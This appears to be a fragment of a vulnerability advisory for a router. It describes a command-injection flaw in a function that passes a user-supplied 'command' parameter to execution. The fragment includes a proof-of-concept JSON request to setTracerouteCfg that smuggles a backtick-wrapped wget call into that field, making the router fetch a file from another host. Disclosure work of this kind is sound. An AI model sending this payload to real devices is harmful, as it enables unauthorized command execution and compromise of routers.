...
In sub_423354 function, it reads in a user-provided parameter `command` .
...
We set `command` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setTracerouteCfg","command":"`wget 192.168.6.1:7777/testpoc`"
}
```
